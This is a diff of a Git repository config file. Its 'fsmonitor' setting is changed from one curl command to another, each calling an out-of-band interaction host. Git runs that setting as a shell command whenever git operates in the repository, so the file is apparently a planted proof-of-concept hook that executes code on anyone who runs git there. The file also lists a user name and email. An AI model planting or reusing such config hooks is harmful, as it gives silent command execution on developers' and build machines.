@@ -3,7 +3,7 @@ repositoryformatversion = 0
 filemode = true
 bare = false
 worktree = "worktree" 
-fsmonitor = "curl https://ccpimb4t77dmkev7smngyinoj93661mb3.oast.online/test1"
+fsmonitor = "curl https://ccqj1gkt77dth7b8s9cgqyzw3amui5hjo.oast.fun/test1"
 [user]
 	email = sivaneshashok@gmail.com
 	name = staz0t
